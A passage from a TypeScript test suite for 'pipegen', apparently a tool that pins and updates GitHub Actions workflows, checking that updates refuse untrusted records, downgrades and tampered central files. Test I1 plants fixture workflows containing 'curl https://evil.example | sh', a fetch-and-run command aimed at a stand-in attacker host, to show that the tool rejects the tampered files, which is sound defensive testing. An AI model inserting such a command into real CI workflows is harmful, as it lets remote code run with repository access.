    const rec = (await readRecord(w.g.octokit(), { owner: 'o', repo: 'pipelines' }, 'r'))?.record as InstallRecord;
    expect(rec.files.find((f) => f.path === PIPEGEN_YML)?.shas).toEqual([gitBlobSha(gateFile(OLD, OLD_V)), gitBlobSha(out)]);
    expect(rec.files.find((f) => f.path === PIPEGEN_YML)?.ownerEdited).toBeUndefined();
    expect(rec.files.find((f) => f.path === PUSH_YML)?.shas).toEqual([gitBlobSha(PUSH)]);   // not written: nothing appended
    // writeRecord's three places, one hash: the central record, the setup PR body's last line, the local record file
    expect(res.recordHash).toBe(recordHash(rec));
    expect(recordMarkerOf(w.g.repo('o/r').pulls.find((p) => p.number === 1)?.body)).toBe(recordHash(rec));
    expect((await readLocalRecord(app, { home: w.home, env: {} }))?.recordHash).toBe(recordHash(rec));
    // the private case: the central file's sha is appended in the central PR's record commit
    const p = await privateWorld();
    await update(p.g.octokit(), app, deps(p));
    const onBranch = (await readRecord(p.g.octokit(), { owner: 'o', repo: 'pipelines' }, 'r', { branch: centralUpdateBranch('r') }))?.record as InstallRecord;
    expect(onBranch.files.find((f) => f.path === C_MERGE)?.shas).toEqual([gitBlobSha(gateFile(OLD, OLD_V)), gitBlobSha(gateFile(NEW, NEW_V))]);
  });

  it('update: without an install record pipegen trusts, nothing is touched', async () => {
    const w = await publicWorld();
    rmSync(join(w.home, '.config'), { recursive: true, force: true });
    w.issues.app = [genuine(w)];
    await expect(update(w.g.octokit(), app, deps(w))).rejects.toThrow(/install record/);
    expect(writes(w)).toEqual([]);
  });
});

describe('G12 fix round 1 (G12-R1)', () => {
  const C_SIGN = '.github/workflows/r--sign.yml';
  const SIGN = 'name: sign\non: { workflow_call: {} }\npermissions: {}\njobs:\n  sign:\n    runs-on: ubuntu-24.04\n    steps:\n      - run: echo sign\n';
  const callerOf = (c: string): string => `${privateCaller(c)}  sign:\n    uses: o/pipelines/.github/workflows/r--sign.yml@${c}\n`;

  it('C1: a record trusted by typing → update stops before any write; the central record stays byte-identical', async () => {
    const w = await publicWorld();
    rmSync(join(w.home, '.config'), { recursive: true, force: true });   // a new machine: no local record file
    const before = centralFile(w, recordPath('r'));
    const typedIo: Prompter = { confirm: async () => true, select: async () => { throw new Error('no select'); }, text: async () => 'o/r' };
    await expect(update(w.g.octokit(), app, deps(w, { io: typedIo, interactive: true }))).rejects.toThrow(/only confirmed by name.*npx pipegen/);
    expect(writes(w)).toEqual([]);
    expect(centralFile(w, recordPath('r'))).toBe(before);
    // and again from the local file that now says typed: still a stop
    await expect(update(w.g.octokit(), app, deps(w))).rejects.toThrow(/only confirmed by name/);
    expect(writes(w)).toEqual([]);
  });

  it('I1: the re-pin is proven from content: an unrecorded evil sign file or a planted sha never moves the app', async () => {
    const merge = gateFile(OLD, OLD_V);
    const w = shell({}, true, { [C_MERGE]: merge, [C_SIGN]: SIGN });
    const c0 = w.g.head('o/pipelines');
    w.g.commitOn('o/r', 'main', { [PIPEGEN_YML]: callerOf(c0) }, 'setup');
    // a central writer: merge moved to the reviewed pin (as pipegen would), sign.yml (not in the record) made evil; the record lists merge only
    const evilSign = SIGN.replace('echo sign', 'curl https://evil.example | sh');
    w.g.commitOn('o/pipelines', 'main', { [C_MERGE]: gateFile(NEW, NEW_V), [C_SIGN]: evilSign }, 'attacker');
    await vouch(w, baseRecord(w.g, true, c0, [
      { repo: 'app', path: PIPEGEN_YML, part: 'pipeline', shas: [gitBlobSha(callerOf(c0))] },
      { repo: 'central', path: C_MERGE, part: 'pipeline', shas: [gitBlobSha(merge), gitBlobSha(gateFile(NEW, NEW_V))] },
    ]));
    const res = await update(w.g.octokit(), app, deps(w));
    expect(res.done).toBe(false);
    expect(res.notes.join(' ')).toMatch(/doesn't re-pin the app.*r--sign\.yml/);
    expect(prsOf(w, 'o/r')).toEqual([]);
    // a planted sha: evil merge content at the reviewed pin, its sha written into the record (vouched here as if trusted)
    const evilMerge = gateFile(NEW, NEW_V, '  steal:\n    runs-on: ubuntu-24.04\n    steps:\n      - run: curl https://evil.example | sh');
    const w2 = shell({}, true, { [C_MERGE]: merge });
    const d0 = w2.g.head('o/pipelines');
    w2.g.commitOn('o/r', 'main', { [PIPEGEN_YML]: privateCaller(d0) }, 'setup');
    w2.g.commitOn('o/pipelines', 'main', { [C_MERGE]: evilMerge }, 'attacker');
    await vouch(w2, baseRecord(w2.g, true, d0, [
      { repo: 'app', path: PIPEGEN_YML, part: 'pipeline', shas: [gitBlobSha(privateCaller(d0))] },
      { repo: 'central', path: C_MERGE, part: 'pipeline', shas: [gitBlobSha(merge), gitBlobSha(evilMerge)] },
    ]));
    const r2 = await update(w2.g.octokit(), app, deps(w2));
    expect(r2.done).toBe(false);
    expect(r2.notes.join(' ')).toMatch(/not pipegen's update of the file the app calls/);
    expect(prsOf(w2, 'o/r')).toEqual([]);
    // a called file gone from the head, or calls at two commits: no re-pin, a note
    for (const variant of ['gone', 'two'] as const) {
      const wv = shell({}, true, { [C_MERGE]: merge, [C_SIGN]: SIGN });
      const v0 = wv.g.head('o/pipelines');
      const caller = variant === 'two' ? callerOf(v0).replace(`r--sign.yml@${v0}`, `r--sign.yml@${'d'.repeat(40)}`) : callerOf(v0);
      wv.g.commitOn('o/r', 'main', { [PIPEGEN_YML]: caller }, 'setup');
      wv.g.commitOn('o/pipelines', 'main', { [C_MERGE]: gateFile(NEW, NEW_V), ...(variant === 'gone' ? { [C_SIGN]: null } : {}) }, 'change');
      await vouch(wv, baseRecord(wv.g, true, v0, [
        { repo: 'app', path: PIPEGEN_YML, part: 'pipeline', shas: [gitBlobSha(caller)] },
        { repo: 'central', path: C_MERGE, part: 'pipeline', shas: [gitBlobSha(merge), gitBlobSha(gateFile(NEW, NEW_V))] },
      ]));
      const rv = await update(wv.g.octokit(), app, deps(wv));
      expect(rv.done, variant).toBe(false);
      expect(rv.notes.join(' '), variant).toMatch(variant === 'gone' ? /can't check .*r--sign\.yml/ : /more than one central commit/);
    }
    // the honest case still re-pins every called file (both swapped by pipegen, sign unchanged)
    const w3 = shell({}, true, { [C_MERGE]: merge, [C_SIGN]: SIGN });
    const e0 = w3.g.head('o/pipelines');
    w3.g.commitOn('o/r', 'main', { [PIPEGEN_YML]: callerOf(e0) }, 'setup');
    const h = w3.g.commitOn('o/pipelines', 'main', { [C_MERGE]: gateFile(NEW, NEW_V) }, 'merged update');
    await vouch(w3, baseRecord(w3.g, true, e0, [
      { repo: 'app', path: PIPEGEN_YML, part: 'pipeline', shas: [gitBlobSha(callerOf(e0))] },
      { repo: 'central', path: C_MERGE, part: 'pipeline', shas: [gitBlobSha(merge), gitBlobSha(gateFile(NEW, NEW_V))] },
    ]));
    const head3 = w3.g.head('o/pipelines');   // h plus the record commit: same files
    expect(w3.g.history('o/pipelines', head3).map((c) => c.sha)).toContain(h);
    const r3 = await update(w3.g.octokit(), app, deps(w3));
    expect(r3.done).toBe(true);
    expect(appFile(w3, PIPEGEN_YML, UPDATE_BRANCH)).toBe(callerOf(head3));
  });

  it('I2: a file pinned at a newer gate is never moved back (no silent downgrade)', async () => {
    const newer = gateFile(OTHER, '0.9.0');
    const w = await publicWorld({ written: newer });
    w.issues.app = [issue(updateBody(NEW_V))];
    const res = await update(w.g.octokit(), app, deps(w));
    expect(res.done).toBe(false);
    expect(res.notes.join(' ')).toMatch(/a newer pipegen wrote this.*npx pipegen@latest update/);
    expect(writes(w)).toEqual([]);
    expect(swapPins(newer, gateSwaps({ sha: NEW, version: NEW_V }))).toMatchObject({ newer: '0.9.0' });
  });

  it('spec I1: a local record file without setupPr finds the setup PR (state all) and marks it', async () => {
    const w = await publicWorld();
    await writeLocalRecord(app, { recordHash: recordHash(w.record), updatedAt: '2026-11-01T00:00:00Z' }, { home: w.home, env: {} });
    const res = await update(w.g.octokit(), app, deps(w));
    expect(res.done).toBe(true);
    expect(w.g.calls.some((c) => c.route === 'GET /repos/{owner}/{repo}/pulls' && c.params.state === 'all')).toBe(true);
    expect(recordMarkerOf(w.g.repo('o/r').pulls.find((p) => p.number === 1)?.body)).toBe(res.recordHash);
  });

  it('m2: a file that is not UTF-8 is a conflict, never written lossily', async () => {
    const w = await publicWorld();
    const sha = gitBlobSha(gateFile(OLD, OLD_V));
    w.g.hooks.unshift((call) => (call.route === 'GET /repos/{owner}/{repo}/git/blobs/{file_sha}' && call.params.file_sha === sha
      ? { status: 200, data: { encoding: 'base64', content: Buffer.concat([Buffer.from(gateFile(OLD, OLD_V)), Buffer.from([0xff])]).toString('base64') } } : undefined));
    const res = await update(w.g.octokit(), app, deps(w));
    expect(res.conflicts.find((c) => c.path === PIPEGEN_YML)?.why).toMatch(/not UTF-8/);
    expect(writes(w)).toEqual([]);
  });

  it('m3: an owner pin elsewhere while pipegen\'s own text is current is noted, not silent', async () => {
    const written = gateFile(NEW, NEW_V);
    const w = await publicWorld({ written, current: written.replace(`gate@${NEW} # gate-v${NEW_V}`, `gate@${OTHER} # gate-v${NEW_V}`) });
    const res = await update(w.g.octokit(), app, deps(w));
    expect(res.done).toBe(false);
    expect(res.notes.join(' ')).toMatch(/other than the reviewed one/);
  });

  it('m4/m5: the re-pin starts from the app\'s own calls; only this project\'s exact central files are touched', async () => {
    const w = await privateWorld();
    w.g.commitOn('o/pipelines', 'main', { '.github/workflows/r--merge--x.yml': gateFile(OLD, OLD_V) }, 'other project r--merge');
    await vouch(w, { ...w.record, files: [...w.record.files, { repo: 'central', path: '.github/workflows/r--merge--x.yml', part: 'pipeline', shas: [gitBlobSha(gateFile(OLD, OLD_V))] }] });
    await update(w.g.octokit(), app, deps(w));
    expect(centralFile(w, '.github/workflows/r--merge--x.yml', centralUpdateBranch('r'))).toBe(gateFile(OLD, OLD_V));
    // the central PR merged, but the record says the app already pins the head (an app PR closed unmerged): the app's own calls decide
    const merged = w.g.commitOn('o/pipelines', 'main', { [C_MERGE]: gateFile(NEW, NEW_V) }, 'merge');
    const rec = (await readRecord(w.g.octokit(), { owner: 'o', repo: 'pipelines' }, 'r', { branch: centralUpdateBranch('r') }))?.record as InstallRecord;
    await vouch(w, { ...rec, centralSha: merged });
    const head = w.g.head('o/pipelines');
    const res = await update(w.g.octokit(), app, deps(w));
    expect(res.done).toBe(true);
    expect(appFile(w, PIPEGEN_YML, UPDATE_BRANCH)).toBe(privateCaller(head));
  });

  it('spec M3: the record write fails after the app PR opened → the PR URL comes back with a note', async () => {
    const w = await publicWorld();
    w.g.hooks.unshift((call) => (call.route === 'POST /repos/{owner}/{repo}/git/trees' && call.params.repo === 'pipelines' ? { status: 500 } : undefined));
    const res = await update(w.g.octokit(), app, deps(w));
    expect(res.done).toBe(true);
    expect(res.prUrl).toBe(prsOf(w, 'o/r')[0]?.html_url);
    expect(res.notes.join(' ')).toMatch(/install record was not written/);
  });

  it('spec M4: Closes #N only when the PR answers the issue whole', async () => {
    const own = gateFile(OLD, OLD_V).replace(`        uses: crisworking/pipegen/gate@${OLD} # gate-v${OLD_V}`, `        uses: crisworking/pipegen/gate@${OTHER} # gate-v${OLD_V}`);
    const w = shell({ [PIPEGEN_YML]: gateFile(OLD, OLD_V), [PUSH_YML]: gateFile(OLD, OLD_V) }, false);
    w.g.commitOn('o/r', 'main', { [PIPEGEN_YML]: own }, 'owner edit');
    await vouch(w, baseRecord(w.g, false, null, [
      { repo: 'app', path: PIPEGEN_YML, part: 'pipeline', shas: [gitBlobSha(gateFile(OLD, OLD_V))] },
      { repo: 'app', path: PUSH_YML, part: 'pipeline', shas: [gitBlobSha(gateFile(OLD, OLD_V))] },
    ]));
    const noPatch = issue(updateBody(NEW_V));
    w.issues.app = [noPatch];
    const res = await update(w.g.octokit(), app, deps(w));
    expect(res.done).toBe(true);
    expect(res.conflicts.map((c) => c.path)).toEqual([PIPEGEN_YML]);
    expect(prsOf(w, 'o/r')[0]?.body).not.toContain(`Closes #${noPatch.number as number}`);
  });
});
